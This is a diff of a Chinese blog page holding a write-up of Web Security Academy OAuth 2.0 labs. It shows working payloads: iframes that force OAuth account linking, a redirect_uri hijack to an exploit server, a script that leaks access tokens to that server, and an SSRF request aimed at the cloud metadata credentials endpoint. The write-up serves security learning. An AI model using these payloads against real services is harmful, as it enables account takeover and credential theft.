@@ -249,7 +249,7 @@
 <li>基于以上设计，OAuth2.0协议即可保证可以使得第三方应用获得权限使用，但又随时处于可控，这就是OAuth2.0的优点所在</li>
 </ul>
 <h2 id="OAuth2-0运行流程和授权模式"><a href="#OAuth2-0运行流程和授权模式" class="headerlink" title="OAuth2.0运行流程和授权模式"></a>OAuth2.0运行流程和授权模式</h2><p>首先了解一下大概结构</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Client: 第三方应用</span><br><span class="line">Resource Owner: 资源所有者</span><br><span class="line">Authorization Server: 授权服务器</span><br><span class="line">Resource Server: 拥有资源信息的服务器</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Client: 第三方应用</span><br><span class="line">Resource Owner: 资源所有者</span><br><span class="line">Authorization Server: 授权服务器</span><br><span class="line">Resource Server: 拥有资源信息的服务器</span><br></pre></td></tr></table></figure>
 
 <p>以下即为运行过程</p>
 <p><img src="/2022/08/11/OAuth2-0%E5%8D%8F%E8%AE%AE%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/a.png"></p>
@@ -308,7 +308,7 @@
 <p>我们重新抓取一个包拿到code，得到code后drop掉不让他成功登录认证</p>
 <p>然后进入exploit修改body</p>
 <p><img src="/2022/08/11/OAuth2-0%E5%8D%8F%E8%AE%AE%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/8.png"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src&#x3D;&quot;https:&#x2F;&#x2F;you-Labe-URL&#x2F;oauth-linking?code&#x3D;xxxx&quot;&gt;&lt;&#x2F;iframe&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;https://you-Labe-URL/oauth-linking?code=xxxx&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
 
 <p>发送给受害者，而后重新登录social media</p>
 <p>成功登录admin</p>
@@ -335,7 +335,7 @@
 <p>可以看到host变成了我们的攻击服务器，这就是问题所在</p>
 <p>我们进入exploit修改body</p>
 <p><img src="/2022/08/11/OAuth2-0%E5%8D%8F%E8%AE%AE%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/15.png"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src&#x3D;&quot;https:&#x2F;&#x2F;oauth-0ab7002704013c25c0e609d702b200d8.web-security-academy.net&#x2F;auth?client_id&#x3D;vna7ueijoqkr7uoxz68yl&amp;redirect_uri&#x3D;https:&#x2F;&#x2F;exploit-0ad700bf04bc3c4bc0f9097701db00da.web-security-academy.net&amp;response_type&#x3D;code&amp;scope&#x3D;openid%20profile%20email&quot;&gt;&lt;&#x2F;iframe&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;https://oauth-0ab7002704013c25c0e609d702b200d8.web-security-academy.net/auth?client_id=vna7ueijoqkr7uoxz68yl&amp;redirect_uri=https://exploit-0ad700bf04bc3c4bc0f9097701db00da.web-security-academy.net&amp;response_type=code&amp;scope=openid%20profile%20email&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
 
 <p>修改redirect_uri重定向回我们的exploit，store存储一下，然后view exploit预览一下</p>
 <p><img src="/2022/08/11/OAuth2-0%E5%8D%8F%E8%AE%AE%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/16.png"></p>
@@ -343,7 +343,7 @@
 <p><img src="/2022/08/11/OAuth2-0%E5%8D%8F%E8%AE%AE%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/17.png"></p>
 <p>然后根据包的发送流程，将code进行修改callback回去</p>
 <p><img src="/2022/08/11/OAuth2-0%E5%8D%8F%E8%AE%AE%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/18.png"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;0a9f002504223c0dc09209d200340068.web-security-academy.net&#x2F;oauth-callback?code&#x3D;FXCVQ2aBY087fAtUfkhq_hoW6Iifug0OlkGcHO31Do6</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://0a9f002504223c0dc09209d200340068.web-security-academy.net/oauth-callback?code=FXCVQ2aBY087fAtUfkhq_hoW6Iifug0OlkGcHO31Do6</span><br></pre></td></tr></table></figure>
 
 <p>成功登录admin，删除用户就行</p>
 </li>
@@ -364,13 +364,13 @@
 <p>抓包放入repeater中测试，发现可以重定向到外域，这样我们就可以利用1这个重定向到我们的攻击服务器，进行敏感数据的窃取</p>
 <p><img src="/2022/08/11/OAuth2-0%E5%8D%8F%E8%AE%AE%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/23.png"></p>
 <p>我们修改url重定向回exploit</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;YOUR-LAB-OAUTH-SERVER.web-security-academy.net&#x2F;auth?client_id&#x3D;YOUR-LAB-CLIENT-ID&amp;redirect_uri&#x3D;https:&#x2F;&#x2F;YOUR-LAB-ID.web-security-academy.net&#x2F;oauth-callback&#x2F;..&#x2F;post&#x2F;next?path&#x3D;https:&#x2F;&#x2F;YOUR-EXPLOIT-SERVER-ID.web-security-academy.net&#x2F;exploit&amp;response_type&#x3D;token&amp;nonce&#x3D;399721827&amp;scope&#x3D;openid%20profile%20email</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://YOUR-LAB-OAUTH-SERVER.web-security-academy.net/auth?client_id=YOUR-LAB-CLIENT-ID&amp;redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.web-security-academy.net/exploit&amp;response_type=token&amp;nonce=399721827&amp;scope=openid%20profile%20email</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p><img src="/2022/08/11/OAuth2-0%E5%8D%8F%E8%AE%AE%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/24.png"></p>
 <p>进行访问，成功返回hello，world</p>
 <p><img src="/2022/08/11/OAuth2-0%E5%8D%8F%E8%AE%AE%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/25.png"></p>
 <p>这样我们就可以编写script，让admin登录从而泄露token</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    if (!document.location.hash) &#123;</span><br><span class="line">        window.location &#x3D; &#39;https:&#x2F;&#x2F;YOUR-LAB-AUTH-SERVER.web-security-academy.net&#x2F;auth?client_id&#x3D;YOUR-LAB-CLIENT-ID&amp;redirect_uri&#x3D;https:&#x2F;&#x2F;YOUR-LAB-ID.web-security-academy.net&#x2F;oauth-callback&#x2F;..&#x2F;post&#x2F;next?path&#x3D;https:&#x2F;&#x2F;YOUR-EXPLOIT-SERVER-ID.web-security-academy.net&#x2F;exploit&#x2F;&amp;response_type&#x3D;token&amp;nonce&#x3D;399721827&amp;scope&#x3D;openid%20profile%20email&#39;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        window.location &#x3D; &#39;&#x2F;?&#39;+document.location.hash.substr(1)</span><br><span class="line">    &#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    if (!document.location.hash) &#123;</span><br><span class="line">        window.location = &#x27;https://YOUR-LAB-AUTH-SERVER.web-security-academy.net/auth?client_id=YOUR-LAB-CLIENT-ID&amp;redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.web-security-academy.net/exploit/&amp;response_type=token&amp;nonce=399721827&amp;scope=openid%20profile%20email&#x27;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        window.location = &#x27;/?&#x27;+document.location.hash.substr(1)</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2022/08/11/OAuth2-0%E5%8D%8F%E8%AE%AE%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/27.png"></p>
 <p>发送给受害者后进入access log，得到access_token</p>
@@ -392,7 +392,7 @@
 <p>他们存储着一些相关的配置</p>
 </blockquote>
 <p>我们尝试访问</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;YOUR-LAB-OAUTH-SERVER.web-security-academy.net&#x2F;.well-known&#x2F;openid-configuration</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://YOUR-LAB-OAUTH-SERVER.web-security-academy.net/.well-known/openid-configuration</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2022/08/11/OAuth2-0%E5%8D%8F%E8%AE%AE%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/29.png"></p>
 <p>可以发现/reg是注册点，我们可以在repeater中创建一个post请求向OAuth请求注册，而这其中必须提供至少一个redirect_uris数组</p>
@@ -400,17 +400,17 @@
 <p>传参后我们可以看到服务器给我们返回了client_id和一系列数据</p>
 <p>我们继续翻看配置参数，其中最有可能存在SSRF的url参数就是<code>logo_uri</code></p>
 <p>我们可以进行尝试，启动Burp Collaborator client</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;reg HTTP&#x2F;1.1</span><br><span class="line">Host: YOUR-LAB-OAUTH-SERVER.web-security-academy.net</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;redirect_uris&quot; : [</span><br><span class="line">        &quot;https:&#x2F;&#x2F;example.com&quot;</span><br><span class="line">    ],</span><br><span class="line">    &quot;logo_uri&quot; : &quot;https:&#x2F;&#x2F;BURP-COLLABORATOR-SUBDOMAIN&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST /reg HTTP/1.1</span><br><span class="line">Host: YOUR-LAB-OAUTH-SERVER.web-security-academy.net</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;redirect_uris&quot; : [</span><br><span class="line">        &quot;https://example.com&quot;</span><br><span class="line">    ],</span><br><span class="line">    &quot;logo_uri&quot; : &quot;https://BURP-COLLABORATOR-SUBDOMAIN&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2022/08/11/OAuth2-0%E5%8D%8F%E8%AE%AE%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/31.png"></p>
 <p>发现可以成功携带数据</p>
 <p><img src="/2022/08/11/OAuth2-0%E5%8D%8F%E8%AE%AE%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/32.png"></p>
 <p>当我们拿着生成的client_id去访问的时候我们也可以发现确实会携带出一些特殊数据</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;client&#x2F;CLIENT-ID&#x2F;logo</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/client/CLIENT-ID/logo</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2022/08/11/OAuth2-0%E5%8D%8F%E8%AE%AE%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/33.png"></p>
 <p>那当我们修改logo_uri为其他url时，我们就可以携带出我们想要的东西了，而题目已经给出了攻击服务器的url，我们替换一下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;reg HTTP&#x2F;1.1</span><br><span class="line">Host: YOUR-LAB-OAUTH-SERVER.web-security-academy.net</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;redirect_uris&quot; : [</span><br><span class="line">        &quot;https:&#x2F;&#x2F;example.com&quot;</span><br><span class="line">    ],</span><br><span class="line">    &quot;logo_uri&quot; : &quot;http:&#x2F;&#x2F;169.254.169.254&#x2F;latest&#x2F;meta-data&#x2F;iam&#x2F;security-credentials&#x2F;admin&#x2F;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST /reg HTTP/1.1</span><br><span class="line">Host: YOUR-LAB-OAUTH-SERVER.web-security-academy.net</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;redirect_uris&quot; : [</span><br><span class="line">        &quot;https://example.com&quot;</span><br><span class="line">    ],</span><br><span class="line">    &quot;logo_uri&quot; : &quot;http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2022/08/11/OAuth2-0%E5%8D%8F%E8%AE%AE%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/34.png"></p>
 <p><img src="/2022/08/11/OAuth2-0%E5%8D%8F%E8%AE%AE%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/35.png"></p>
@@ -701,18 +701,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">web缓存漏洞</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">Http请求走私</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">学习笔记</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">writeup</a>
               </li>
              
@@ -722,6 +710,18 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">CSP</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">学习笔记</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">web缓存漏洞</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">Http请求走私</a>
               </li>
              
               <li class="article-tag-list-item">
